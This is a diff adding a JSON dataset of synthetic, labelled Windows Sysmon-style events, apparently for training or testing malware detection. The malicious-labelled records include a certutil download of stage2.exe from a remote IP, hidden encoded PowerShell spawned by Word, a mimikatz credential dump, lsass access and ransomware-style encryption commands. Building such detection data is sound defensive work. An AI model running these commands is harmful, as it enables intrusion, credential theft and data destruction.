+    "Image": "C:\\Windows\\System32\\svchost.exe",
+    "CommandLine": "svchost.exe -k netsvcs -p -s BITS",
+    "ParentImage": "C:\\Windows\\System32\\services.exe",
+    "User": "NT AUTHORITY\\SYSTEM",
+    "Hashes": "MD5=ABC123",
+    "Signed": true,
+    "_label": 0
+  },
+  {
+    "EventID": 11,
+    "Image": "C:\\Windows\\System32\\svchost.exe",
+    "TargetFilename": "C:\\Windows\\Prefetch\\CHROME.EXE-ABC12345.pf",
+    "User": "SYSTEM",
+    "_label": 0
+  },
+  {
+    "EventID": 1,
+    "Image": "C:\\Windows\\System32\\notepad.exe",
+    "CommandLine": "notepad.exe C:\\Users\\alice\\report.txt",
+    "ParentImage": "C:\\Windows\\explorer.exe",
+    "User": "CORP\\alice",
+    "Signed": true,
+    "_label": 0
+  },
+  {
+    "EventID": 1,
+    "Image": "C:\\Users\\Public\\locker.exe",
+    "CommandLine": "locker.exe /encrypt C:\\Finance\\ /key abc123",
+    "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+    "User": "CORP\\finance1",
+    "Signed": false,
+    "_label": 1
+  },
+  {
+    "EventID": 1,
+    "Image": "C:\\Windows\\System32\\notepad.exe",
+    "CommandLine": "notepad.exe C:\\Users\\alice\\report.txt",
+    "ParentImage": "C:\\Windows\\explorer.exe",
+    "User": "CORP\\alice",
+    "Signed": true,
+    "_label": 0
+  },
+  {
+    "EventID": 1,
+    "Image": "C:\\Windows\\System32\\svchost.exe",
+    "CommandLine": "svchost.exe -k netsvcs -p -s BITS",
+    "ParentImage": "C:\\Windows\\System32\\services.exe",
+    "User": "NT AUTHORITY\\SYSTEM",
+    "Hashes": "MD5=ABC123",
+    "Signed": true,
+    "_label": 0
+  },
+  {
+    "EventID": 1,
+    "Image": "C:\\Users\\Public\\locker.exe",
+    "CommandLine": "locker.exe /encrypt C:\\Finance\\ /key abc123",
+    "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+    "User": "CORP\\finance1",
+    "Signed": false,
+    "_label": 1
+  },
+  {
+    "EventID": 1,
+    "Image": "C:\\Windows\\System32\\svchost.exe",
+    "CommandLine": "svchost.exe -k netsvcs -p -s BITS",
+    "ParentImage": "C:\\Windows\\System32\\services.exe",
+    "User": "NT AUTHORITY\\SYSTEM",
+    "Hashes": "MD5=ABC123",
+    "Signed": true,
+    "_label": 0
+  },
+  {
+    "EventID": 1,
+    "Image": "C:\\Windows\\System32\\notepad.exe",
+    "CommandLine": "notepad.exe C:\\Users\\alice\\report.txt",
+    "ParentImage": "C:\\Windows\\explorer.exe",
+    "User": "CORP\\alice",
+    "Signed": true,
+    "_label": 0
+  },
+  {
+    "EventID": 1,
+    "Image": "C:\\Windows\\System32\\certutil.exe",
+    "CommandLine": "certutil -urlcache -split -f http://185.220.101.45/stage2.exe",
+    "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+    "User": "CORP\\alice",
+    "_label": 1
+  },
+  {
+    "EventID": 11,
+    "Image": "C:\\Windows\\System32\\svchost.exe",
+    "TargetFilename": "C:\\Windows\\Prefetch\\CHROME.EXE-ABC12345.pf",
+    "User": "SYSTEM",
+    "_label": 0
+  },
+  {
+    "EventID": 1,
+    "Image": "C:\\Windows\\System32\\svchost.exe",
+    "CommandLine": "svchost.exe -k netsvcs -p -s BITS",
+    "ParentImage": "C:\\Windows\\System32\\services.exe",
+    "User": "NT AUTHORITY\\SYSTEM",
+    "Hashes": "MD5=ABC123",
+    "Signed": true,
+    "_label": 0
+  },
+  {
+    "EventID": 11,
+    "Image": "C:\\Windows\\System32\\svchost.exe",
+    "TargetFilename": "C:\\Windows\\Prefetch\\CHROME.EXE-ABC12345.pf",
+    "User": "SYSTEM",
+    "_label": 0
+  },
+  {
+    "EventID": 8,
+    "SourceImage": "C:\\Windows\\System32\\powershell.exe",
+    "TargetImage": "C:\\Windows\\System32\\svchost.exe",
+    "StartFunction": "NtCreateThread",
+    "User": "CORP\\alice",
+    "_label": 1
+  },
+  {
+    "EventID": 1,
+    "Image": "C:\\Windows\\System32\\svchost.exe",
+    "CommandLine": "svchost.exe -k netsvcs -p -s BITS",
+    "ParentImage": "C:\\Windows\\System32\\services.exe",
+    "User": "NT AUTHORITY\\SYSTEM",
+    "Hashes": "MD5=ABC123",
+    "Signed": true,
+    "_label": 0
+  },
+  {
+    "EventID": 11,
+    "Image": "C:\\Windows\\System32\\svchost.exe",
+    "TargetFilename": "C:\\Windows\\Prefetch\\CHROME.EXE-ABC12345.pf",
+    "User": "SYSTEM",
+    "_label": 0
+  },
+  {
+    "EventID": 11,
+    "Image": "C:\\Windows\\System32\\svchost.exe",
+    "TargetFilename": "C:\\Windows\\Prefetch\\CHROME.EXE-ABC12345.pf",
+    "User": "SYSTEM",
+    "_label": 0
+  },
+  {
+    "EventID": 11,
+    "Image": "C:\\Windows\\System32\\svchost.exe",
+    "TargetFilename": "C:\\Windows\\Prefetch\\CHROME.EXE-ABC12345.pf",
+    "User": "SYSTEM",
+    "_label": 0
+  },
+  {
+    "EventID": 1,
+    "Image": "C:\\Windows\\System32\\svchost.exe",
+    "CommandLine": "svchost.exe -k netsvcs -p -s BITS",
+    "ParentImage": "C:\\Windows\\System32\\services.exe",
+    "User": "NT AUTHORITY\\SYSTEM",
+    "Hashes": "MD5=ABC123",
+    "Signed": true,
+    "_label": 0
+  },
+  {
+    "EventID": 1,
+    "Image": "C:\\Windows\\System32\\certutil.exe",
+    "CommandLine": "certutil -urlcache -split -f http://185.220.101.45/stage2.exe",
+    "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+    "User": "CORP\\alice",
+    "_label": 1
+  },
+  {
+    "EventID": 1,
+    "Image": "C:\\Windows\\System32\\notepad.exe",
+    "CommandLine": "notepad.exe C:\\Users\\alice\\report.txt",
+    "ParentImage": "C:\\Windows\\explorer.exe",
+    "User": "CORP\\alice",
+    "Signed": true,
+    "_label": 0
+  },
+  {
+    "EventID": 1,
+    "Image": "C:\\Windows\\System32\\cmd.exe",
+    "CommandLine": "cmd /c powershell -nop -w hidden -enc JABjAD0ATgBlAHcA",
+    "ParentImage": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
+    "User": "CORP\\alice",
+    "Signed": true,
+    "_label": 1
+  },
+  {
+    "EventID": 1,
+    "Image": "C:\\Windows\\System32\\notepad.exe",
+    "CommandLine": "notepad.exe C:\\Users\\alice\\report.txt",
+    "ParentImage": "C:\\Windows\\explorer.exe",
+    "User": "CORP\\alice",
+    "Signed": true,
+    "_label": 0
+  },
+  {
+    "EventID": 3,
+    "Image": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
+    "DestinationIp": "8.8.8.8",
+    "DestinationPort": 443,
+    "User": "CORP\\alice",
+    "Signed": true,
+    "_label": 0
+  },
+  {
+    "EventID": 1,
+    "Image": "C:\\Windows\\System32\\notepad.exe",
+    "CommandLine": "notepad.exe C:\\Users\\alice\\report.txt",
+    "ParentImage": "C:\\Windows\\explorer.exe",
+    "User": "CORP\\alice",
+    "Signed": true,
+    "_label": 0
+  },
+  {
+    "EventID": 1,
+    "Image": "C:\\Windows\\System32\\svchost.exe",
+    "CommandLine": "svchost.exe -k netsvcs -p -s BITS",
+    "ParentImage": "C:\\Windows\\System32\\services.exe",
+    "User": "NT AUTHORITY\\SYSTEM",
+    "Hashes": "MD5=ABC123",
+    "Signed": true,
+    "_label": 0
+  },
+  {
+    "EventID": 11,
+    "Image": "C:\\Windows\\System32\\svchost.exe",
+    "TargetFilename": "C:\\Windows\\Prefetch\\CHROME.EXE-ABC12345.pf",
+    "User": "SYSTEM",
+    "_label": 0
+  },
+  {
+    "EventID": 11,
+    "Image": "C:\\Windows\\System32\\svchost.exe",
+    "TargetFilename": "C:\\Windows\\Prefetch\\CHROME.EXE-ABC12345.pf",
+    "User": "SYSTEM",
+    "_label": 0
+  },
+  {
+    "EventID": 1,
+    "Image": "C:\\Windows\\System32\\certutil.exe",
+    "CommandLine": "certutil -urlcache -split -f http://185.220.101.45/stage2.exe",
+    "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+    "User": "CORP\\alice",
+    "_label": 1
+  },
+  {
+    "EventID": 3,
+    "Image": "C:\\Users\\Public\\loader.exe",
+    "DestinationIp": "185.220.101.45",
+    "DestinationPort": 4444,
+    "User": "CORP\\finance1",
+    "Signed": false,
+    "_label": 1
+  },
+  {
+    "EventID": 7,
+    "Image": "C:\\Windows\\System32\\rundll32.exe",
+    "ImageLoaded": "C:\\Users\\Temp\\evil.dll",
+    "Signed": false,
+    "User": "CORP\\alice",
+    "_label": 1
+  },
+  {
+    "EventID": 1,
+    "Image": "C:\\Users\\Public\\locker.exe",
+    "CommandLine": "locker.exe /encrypt C:\\Finance\\ /key abc123",
+    "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+    "User": "CORP\\finance1",
+    "Signed": false,
+    "_label": 1
+  },
+  {
+    "EventID": 3,
+    "Image": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
+    "DestinationIp": "8.8.8.8",
+    "DestinationPort": 443,
+    "User": "CORP\\alice",
+    "Signed": true,
+    "_label": 0
+  },
+  {
+    "EventID": 1,
+    "Image": "C:\\Windows\\System32\\svchost.exe",
+    "CommandLine": "svchost.exe -k netsvcs -p -s BITS",
+    "ParentImage": "C:\\Windows\\System32\\services.exe",
+    "User": "NT AUTHORITY\\SYSTEM",
+    "Hashes": "MD5=ABC123",
+    "Signed": true,
+    "_label": 0
+  },
+  {
+    "EventID": 3,
+    "Image": "C:\\Users\\Public\\loader.exe",
+    "DestinationIp": "185.220.101.45",
+    "DestinationPort": 4444,
+    "User": "CORP\\finance1",
+    "Signed": false,
+    "_label": 1
+  },
+  {
+    "EventID": 1,
+    "Image": "C:\\Windows\\System32\\svchost.exe",
+    "CommandLine": "svchost.exe -k netsvcs -p -s BITS",
+    "ParentImage": "C:\\Windows\\System32\\services.exe",
+    "User": "NT AUTHORITY\\SYSTEM",
+    "Hashes": "MD5=ABC123",
+    "Signed": true,
+    "_label": 0
+  },
+  {
+    "EventID": 1,
+    "Image": "C:\\Windows\\System32\\svchost.exe",
+    "CommandLine": "svchost.exe -k netsvcs -p -s BITS",
+    "ParentImage": "C:\\Windows\\System32\\services.exe",
+    "User": "NT AUTHORITY\\SYSTEM",
+    "Hashes": "MD5=ABC123",
+    "Signed": true,
+    "_label": 0
+  },
+  {
+    "EventID": 1,
+    "Image": "C:\\Windows\\System32\\notepad.exe",
+    "CommandLine": "notepad.exe C:\\Users\\alice\\report.txt",
+    "ParentImage": "C:\\Windows\\explorer.exe",
+    "User": "CORP\\alice",
+    "Signed": true,
+    "_label": 0
+  },
+  {
+    "EventID": 7,
+    "Image": "C:\\Windows\\System32\\rundll32.exe",
+    "ImageLoaded": "C:\\Users\\Temp\\evil.dll",
+    "Signed": false,
+    "User": "CORP\\alice",
+    "_label": 1
+  },
+  {
+    "EventID": 3,
+    "Image": "C:\\Users\\Public\\loader.exe",
+    "DestinationIp": "185.220.101.45",
+    "DestinationPort": 4444,
+    "User": "CORP\\finance1",
+    "Signed": false,
+    "_label": 1
+  },
+  {
+    "EventID": 1,
+    "Image": "C:\\Windows\\System32\\cmd.exe",
+    "CommandLine": "cmd /c powershell -nop -w hidden -enc JABjAD0ATgBlAHcA",
+    "ParentImage": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
+    "User": "CORP\\alice",
+    "Signed": true,
+    "_label": 1
+  },
+  {
+    "EventID": 1,
+    "Image": "C:\\Windows\\System32\\notepad.exe",
+    "CommandLine": "notepad.exe C:\\Users\\alice\\report.txt",
+    "ParentImage": "C:\\Windows\\explorer.exe",
+    "User": "CORP\\alice",
+    "Signed": true,
+    "_label": 0
+  },
+  {
+    "EventID": 11,
+    "Image": "C:\\Windows\\System32\\svchost.exe",
+    "TargetFilename": "C:\\Windows\\Prefetch\\CHROME.EXE-ABC12345.pf",
+    "User": "SYSTEM",
+    "_label": 0
+  },
+  {
+    "EventID": 1,
+    "Image": "C:\\Windows\\System32\\notepad.exe",
+    "CommandLine": "notepad.exe C:\\Users\\alice\\report.txt",
+    "ParentImage": "C:\\Windows\\explorer.exe",
+    "User": "CORP\\alice",
+    "Signed": true,
+    "_label": 0
+  },
+  {
+    "EventID": 11,
+    "Image": "C:\\Windows\\System32\\svchost.exe",
+    "TargetFilename": "C:\\Windows\\Prefetch\\CHROME.EXE-ABC12345.pf",
+    "User": "SYSTEM",
+    "_label": 0
+  },
+  {
+    "EventID": 1,
+    "Image": "C:\\Users\\Public\\locker.exe",
+    "CommandLine": "locker.exe /encrypt C:\\Finance\\ /key abc123",
+    "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+    "User": "CORP\\finance1",
+    "Signed": false,
+    "_label": 1
+  },
+  {
+    "EventID": 11,
+    "Image": "C:\\Windows\\System32\\svchost.exe",
+    "TargetFilename": "C:\\Windows\\Prefetch\\CHROME.EXE-ABC12345.pf",
+    "User": "SYSTEM",
+    "_label": 0
+  },
+  {
+    "EventID": 1,
+    "Image": "C:\\Windows\\System32\\svchost.exe",
+    "CommandLine": "svchost.exe -k netsvcs -p -s BITS",
+    "ParentImage": "C:\\Windows\\System32\\services.exe",
+    "User": "NT AUTHORITY\\SYSTEM",
+    "Hashes": "MD5=ABC123",
+    "Signed": true,
+    "_label": 0
+  },
+  {
+    "EventID": 3,
+    "Image": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
+    "DestinationIp": "8.8.8.8",
+    "DestinationPort": 443,
+    "User": "CORP\\alice",
+    "Signed": true,
+    "_label": 0
+  },
+  {
+    "EventID": 1,
+    "Image": "C:\\Windows\\System32\\notepad.exe",
+    "CommandLine": "notepad.exe C:\\Users\\alice\\report.txt",
+    "ParentImage": "C:\\Windows\\explorer.exe",
+    "User": "CORP\\alice",
+    "Signed": true,
+    "_label": 0
+  },
+  {
+    "EventID": 8,
+    "SourceImage": "C:\\Windows\\System32\\powershell.exe",
+    "TargetImage": "C:\\Windows\\System32\\svchost.exe",
+    "StartFunction": "NtCreateThread",
+    "User": "CORP\\alice",
+    "_label": 1
+  },
+  {
+    "EventID": 3,
+    "Image": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
+    "DestinationIp": "8.8.8.8",
+    "DestinationPort": 443,
+    "User": "CORP\\alice",
+    "Signed": true,
+    "_label": 0
+  },
+  {
+    "EventID": 1,
+    "Image": "C:\\Windows\\System32\\notepad.exe",
+    "CommandLine": "notepad.exe C:\\Users\\alice\\report.txt",
+    "ParentImage": "C:\\Windows\\explorer.exe",
+    "User": "CORP\\alice",
+    "Signed": true,
+    "_label": 0
+  },
+  {
+    "EventID": 10,
+    "SourceImage": "C:\\Windows\\System32\\cmd.exe",
+    "TargetImage": "C:\\Windows\\System32\\lsass.exe",
+    "GrantedAccess": "0x1010",
+    "User": "CORP\\finance1",
+    "_label": 1
+  },
+  {
+    "EventID": 1,
+    "Image": "C:\\Windows\\System32\\svchost.exe",
+    "CommandLine": "svchost.exe -k netsvcs -p -s BITS",
+    "ParentImage": "C:\\Windows\\System32\\services.exe",
+    "User": "NT AUTHORITY\\SYSTEM",
+    "Hashes": "MD5=ABC123",
+    "Signed": true,
+    "_label": 0
+  },
+  {
+    "EventID": 1,
+    "Image": "C:\\Windows\\System32\\notepad.exe",
+    "CommandLine": "notepad.exe C:\\Users\\alice\\report.txt",
+    "ParentImage": "C:\\Windows\\explorer.exe",
+    "User": "CORP\\alice",
+    "Signed": true,
+    "_label": 0
+  },
+  {
+    "EventID": 11,
+    "Image": "C:\\Windows\\System32\\svchost.exe",
+    "TargetFilename": "C:\\Windows\\Prefetch\\CHROME.EXE-ABC12345.pf",
+    "User": "SYSTEM",
+    "_label": 0
+  },
+  {
+    "EventID": 1,
+    "Image": "C:\\Windows\\System32\\notepad.exe",
+    "CommandLine": "notepad.exe C:\\Users\\alice\\report.txt",
+    "ParentImage": "C:\\Windows\\explorer.exe",
+    "User": "CORP\\alice",
+    "Signed": true,
+    "_label": 0
+  },
+  {
+    "EventID": 1,
+    "Image": "C:\\Windows\\System32\\notepad.exe",
+    "CommandLine": "notepad.exe C:\\Users\\alice\\report.txt",
+    "ParentImage": "C:\\Windows\\explorer.exe",
+    "User": "CORP\\alice",
+    "Signed": true,
+    "_label": 0
+  },
+  {
+    "EventID": 11,
+    "Image": "C:\\Windows\\System32\\svchost.exe",
+    "TargetFilename": "C:\\Windows\\Prefetch\\CHROME.EXE-ABC12345.pf",
+    "User": "SYSTEM",
+    "_label": 0
+  },
+  {
+    "EventID": 11,
+    "Image": "C:\\Windows\\System32\\svchost.exe",
+    "TargetFilename": "C:\\Windows\\Prefetch\\CHROME.EXE-ABC12345.pf",
+    "User": "SYSTEM",
+    "_label": 0
+  },
+  {
+    "EventID": 3,
+    "Image": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
+    "DestinationIp": "8.8.8.8",
+    "DestinationPort": 443,
+    "User": "CORP\\alice",
+    "Signed": true,
+    "_label": 0
+  },
+  {
+    "EventID": 1,
+    "Image": "C:\\Windows\\System32\\certutil.exe",
+    "CommandLine": "certutil -urlcache -split -f http://185.220.101.45/stage2.exe",
+    "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+    "User": "CORP\\alice",
+    "_label": 1
+  },
+  {
+    "EventID": 3,
+    "Image": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
+    "DestinationIp": "8.8.8.8",
+    "DestinationPort": 443,
+    "User": "CORP\\alice",
+    "Signed": true,
+    "_label": 0
+  },
+  {
+    "EventID": 1,
+    "Image": "C:\\Windows\\System32\\notepad.exe",
+    "CommandLine": "notepad.exe C:\\Users\\alice\\report.txt",
+    "ParentImage": "C:\\Windows\\explorer.exe",
+    "User": "CORP\\alice",
+    "Signed": true,
+    "_label": 0
+  },
+  {
+    "EventID": 1,
+    "Image": "C:\\Windows\\System32\\svchost.exe",
+    "CommandLine": "svchost.exe -k netsvcs -p -s BITS",
+    "ParentImage": "C:\\Windows\\System32\\services.exe",
+    "User": "NT AUTHORITY\\SYSTEM",
+    "Hashes": "MD5=ABC123",
+    "Signed": true,
+    "_label": 0
+  },
+  {
+    "EventID": 11,
+    "Image": "C:\\Windows\\System32\\svchost.exe",
+    "TargetFilename": "C:\\Windows\\Prefetch\\CHROME.EXE-ABC12345.pf",
+    "User": "SYSTEM",
+    "_label": 0
+  },
+  {
+    "EventID": 1,
+    "Image": "C:\\Windows\\System32\\notepad.exe",
+    "CommandLine": "notepad.exe C:\\Users\\alice\\report.txt",
+    "ParentImage": "C:\\Windows\\explorer.exe",
+    "User": "CORP\\alice",
+    "Signed": true,
+    "_label": 0
+  },
+  {
+    "EventID": 1,
+    "Image": "C:\\Windows\\System32\\svchost.exe",
+    "CommandLine": "svchost.exe -k netsvcs -p -s BITS",
+    "ParentImage": "C:\\Windows\\System32\\services.exe",
+    "User": "NT AUTHORITY\\SYSTEM",
+    "Hashes": "MD5=ABC123",
+    "Signed": true,
+    "_label": 0
+  },
+  {
+    "EventID": 1,
+    "Image": "C:\\Windows\\System32\\svchost.exe",
+    "CommandLine": "svchost.exe -k netsvcs -p -s BITS",
+    "ParentImage": "C:\\Windows\\System32\\services.exe",
+    "User": "NT AUTHORITY\\SYSTEM",
+    "Hashes": "MD5=ABC123",
+    "Signed": true,
+    "_label": 0
+  },
+  {
+    "EventID": 3,
+    "Image": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
+    "DestinationIp": "8.8.8.8",
+    "DestinationPort": 443,
+    "User": "CORP\\alice",
+    "Signed": true,
+    "_label": 0
+  },
+  {
+    "EventID": 1,
+    "Image": "C:\\Windows\\System32\\svchost.exe",
+    "CommandLine": "svchost.exe -k netsvcs -p -s BITS",
+    "ParentImage": "C:\\Windows\\System32\\services.exe",
+    "User": "NT AUTHORITY\\SYSTEM",
+    "Hashes": "MD5=ABC123",
+    "Signed": true,
+    "_label": 0
+  },
+  {
+    "EventID": 10,
+    "SourceImage": "C:\\Windows\\System32\\cmd.exe",
+    "TargetImage": "C:\\Windows\\System32\\lsass.exe",
+    "GrantedAccess": "0x1010",
+    "User": "CORP\\finance1",
+    "_label": 1
+  },
+  {
+    "EventID": 3,
+    "Image": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
+    "DestinationIp": "8.8.8.8",
+    "DestinationPort": 443,
+    "User": "CORP\\alice",
+    "Signed": true,
+    "_label": 0
+  },
+  {
+    "EventID": 1,
+    "Image": "C:\\Windows\\System32\\cmd.exe",
+    "CommandLine": "cmd /c powershell -nop -w hidden -enc JABjAD0ATgBlAHcA",
+    "ParentImage": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
+    "User": "CORP\\alice",
+    "Signed": true,
+    "_label": 1
+  },
+  {
+    "EventID": 11,
+    "Image": "C:\\Windows\\System32\\svchost.exe",
+    "TargetFilename": "C:\\Windows\\Prefetch\\CHROME.EXE-ABC12345.pf",
+    "User": "SYSTEM",
+    "_label": 0
+  },
+  {
+    "EventID": 1,
+    "Image": "C:\\Windows\\System32\\svchost.exe",
+    "CommandLine": "svchost.exe -k netsvcs -p -s BITS",
+    "ParentImage": "C:\\Windows\\System32\\services.exe",
+    "User": "NT AUTHORITY\\SYSTEM",
+    "Hashes": "MD5=ABC123",
+    "Signed": true,
+    "_label": 0
+  },
+  {
+    "EventID": 11,
+    "Image": "C:\\Windows\\System32\\svchost.exe",
+    "TargetFilename": "C:\\Windows\\Prefetch\\CHROME.EXE-ABC12345.pf",
+    "User": "SYSTEM",
+    "_label": 0
+  },
+  {
+    "EventID": 8,
+    "SourceImage": "C:\\Windows\\System32\\powershell.exe",
+    "TargetImage": "C:\\Windows\\System32\\svchost.exe",
+    "StartFunction": "NtCreateThread",
+    "User": "CORP\\alice",
+    "_label": 1
+  },
+  {
+    "EventID": 3,
+    "Image": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
+    "DestinationIp": "8.8.8.8",
+    "DestinationPort": 443,
+    "User": "CORP\\alice",
+    "Signed": true,
+    "_label": 0
+  },
+  {
+    "EventID": 1,
+    "Image": "C:\\Windows\\System32\\certutil.exe",
+    "CommandLine": "certutil -urlcache -split -f http://185.220.101.45/stage2.exe",
+    "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+    "User": "CORP\\alice",
+    "_label": 1
+  },
+  {
+    "EventID": 11,
+    "Image": "C:\\Windows\\System32\\svchost.exe",
+    "TargetFilename": "C:\\Windows\\Prefetch\\CHROME.EXE-ABC12345.pf",
+    "User": "SYSTEM",
+    "_label": 0
+  },
+  {
+    "EventID": 1,
+    "Image": "C:\\Windows\\System32\\notepad.exe",
+    "CommandLine": "notepad.exe C:\\Users\\alice\\report.txt",
+    "ParentImage": "C:\\Windows\\explorer.exe",
+    "User": "CORP\\alice",
+    "Signed": true,
+    "_label": 0
+  },
+  {
+    "EventID": 8,
+    "SourceImage": "C:\\Windows\\System32\\powershell.exe",
+    "TargetImage": "C:\\Windows\\System32\\svchost.exe",
+    "StartFunction": "NtCreateThread",
+    "User": "CORP\\alice",
+    "_label": 1
+  },
+  {
+    "EventID": 1,
+    "Image": "C:\\Windows\\System32\\notepad.exe",
+    "CommandLine": "notepad.exe C:\\Users\\alice\\report.txt",
+    "ParentImage": "C:\\Windows\\explorer.exe",
+    "User": "CORP\\alice",
+    "Signed": true,
+    "_label": 0
+  },
+  {
+    "EventID": 1,
+    "Image": "C:\\Windows\\System32\\svchost.exe",
+    "CommandLine": "svchost.exe -k netsvcs -p -s BITS",
+    "ParentImage": "C:\\Windows\\System32\\services.exe",
+    "User": "NT AUTHORITY\\SYSTEM",
+    "Hashes": "MD5=ABC123",
+    "Signed": true,
+    "_label": 0
+  },
+  {
+    "EventID": 3,
+    "Image": "C:\\Users\\Public\\loader.exe",
+    "DestinationIp": "185.220.101.45",
+    "DestinationPort": 4444,
+    "User": "CORP\\finance1",
+    "Signed": false,
+    "_label": 1
+  },
+  {
+    "EventID": 11,
+    "Image": "C:\\Windows\\System32\\svchost.exe",
+    "TargetFilename": "C:\\Windows\\Prefetch\\CHROME.EXE-ABC12345.pf",
+    "User": "SYSTEM",
+    "_label": 0
+  },
+  {
+    "EventID": 1,
+    "Image": "C:\\Windows\\System32\\cmd.exe",
+    "CommandLine": "cmd /c powershell -nop -w hidden -enc JABjAD0ATgBlAHcA",
+    "ParentImage": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
+    "User": "CORP\\alice",
+    "Signed": true,
+    "_label": 1
+  },
+  {
+    "EventID": 8,
+    "SourceImage": "C:\\Windows\\System32\\powershell.exe",
+    "TargetImage": "C:\\Windows\\System32\\svchost.exe",
+    "StartFunction": "NtCreateThread",
+    "User": "CORP\\alice",
+    "_label": 1
+  },
+  {
+    "EventID": 1,
+    "Image": "C:\\Windows\\System32\\svchost.exe",
+    "CommandLine": "svchost.exe -k netsvcs -p -s BITS",
+    "ParentImage": "C:\\Windows\\System32\\services.exe",
+    "User": "NT AUTHORITY\\SYSTEM",
+    "Hashes": "MD5=ABC123",
+    "Signed": true,
+    "_label": 0
+  },
+  {
+    "EventID": 7,
+    "Image": "C:\\Windows\\System32\\rundll32.exe",
+    "ImageLoaded": "C:\\Users\\Temp\\evil.dll",
+    "Signed": false,
+    "User": "CORP\\alice",
+    "_label": 1
+  },
+  {
+    "EventID": 3,
+    "Image": "C:\\Users\\Public\\loader.exe",
+    "DestinationIp": "185.220.101.45",
+    "DestinationPort": 4444,
+    "User": "CORP\\finance1",
+    "Signed": false,
+    "_label": 1
+  },
+  {
+    "EventID": 7,
+    "Image": "C:\\Windows\\System32\\rundll32.exe",
+    "ImageLoaded": "C:\\Users\\Temp\\evil.dll",
+    "Signed": false,
+    "User": "CORP\\alice",
+    "_label": 1
+  },
+  {
+    "EventID": 7,
+    "Image": "C:\\Windows\\System32\\rundll32.exe",
+    "ImageLoaded": "C:\\Users\\Temp\\evil.dll",
+    "Signed": false,
+    "User": "CORP\\alice",
+    "_label": 1
+  },
+  {
+    "EventID": 1,
+    "Image": "C:\\Windows\\System32\\svchost.exe",
+    "CommandLine": "svchost.exe -k netsvcs -p -s BITS",
+    "ParentImage": "C:\\Windows\\System32\\services.exe",
+    "User": "NT AUTHORITY\\SYSTEM",
+    "Hashes": "MD5=ABC123",
+    "Signed": true,
+    "_label": 0
+  },
+  {
+    "EventID": 8,
+    "SourceImage": "C:\\Windows\\System32\\powershell.exe",
+    "TargetImage": "C:\\Windows\\System32\\svchost.exe",
+    "StartFunction": "NtCreateThread",
+    "User": "CORP\\alice",
+    "_label": 1
+  },
+  {
+    "EventID": 1,
+    "Image": "C:\\Windows\\System32\\svchost.exe",
+    "CommandLine": "svchost.exe -k netsvcs -p -s BITS",
+    "ParentImage": "C:\\Windows\\System32\\services.exe",
+    "User": "NT AUTHORITY\\SYSTEM",
+    "Hashes": "MD5=ABC123",
+    "Signed": true,
+    "_label": 0
+  },
+  {
+    "EventID": 1,
+    "Image": "C:\\Windows\\Temp\\mimikatz.exe",
+    "CommandLine": "mimikatz sekurlsa::logonpasswords exit",
+    "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+    "User": "CORP\\finance1",
+    "Hashes": "MD5=DEADBEEF",
+    "Signed": false,
+    "_label": 1
+  },
+  {
+    "EventID": 11,
+    "Image": "C:\\Windows\\System32\\svchost.exe",
+    "TargetFilename": "C:\\Windows\\Prefetch\\CHROME.EXE-ABC12345.pf",
+    "User": "SYSTEM",
+    "_label": 0
+  },
+  {
+    "EventID": 3,
+    "Image": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
+    "DestinationIp": "8.8.8.8",
+    "DestinationPort": 443,
+    "User": "CORP\\alice",
+    "Signed": true,
+    "_label": 0
+  },
+  {
+    "EventID": 7,
+    "Image": "C:\\Windows\\System32\\rundll32.exe",
+    "ImageLoaded": "C:\\Users\\Temp\\evil.dll",
+    "Signed": false,
+    "User": "CORP\\alice",
+    "_label": 1
+  },
+  {
+    "EventID": 11,
+    "Image": "C:\\Windows\\System32\\svchost.exe",
+    "TargetFilename": "C:\\Windows\\Prefetch\\CHROME.EXE-ABC12345.pf",
+    "User": "SYSTEM",
+    "_label": 0
+  },
+  {
+    "EventID": 1,
+    "Image": "C:\\Windows\\System32\\certutil.exe",
+    "CommandLine": "certutil -urlcache -split -f http://185.220.101.45/stage2.exe",
+    "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+    "User": "CORP\\alice",
+    "_label": 1
+  },
+  {
+    "EventID": 3,
+    "Image": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
+    "DestinationIp": "8.8.8.8",
+    "DestinationPort": 443,
+    "User": "CORP\\alice",
+    "Signed": true,
+    "_label": 0
+  },
+  {
+    "EventID": 1,
+    "Image": "C:\\Users\\Public\\locker.exe",
+    "CommandLine": "locker.exe /encrypt C:\\Finance\\ /key abc123",
+    "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+    "User": "CORP\\finance1",
+    "Signed": false,
+    "_label": 1
+  },
+  {
+    "EventID": 3,
+    "Image": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
+    "DestinationIp": "8.8.8.8",
+    "DestinationPort": 443,
+    "User": "CORP\\alice",
+    "Signed": true,
+    "_label": 0
+  },
+  {
+    "EventID": 3,
+    "Image": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
+    "DestinationIp": "8.8.8.8",
+    "DestinationPort": 443,
+    "User": "CORP\\alice",
+    "Signed": true,
+    "_label": 0
+  },
+  {
+    "EventID": 11,
+    "Image": "C:\\Windows\\System32\\svchost.exe",
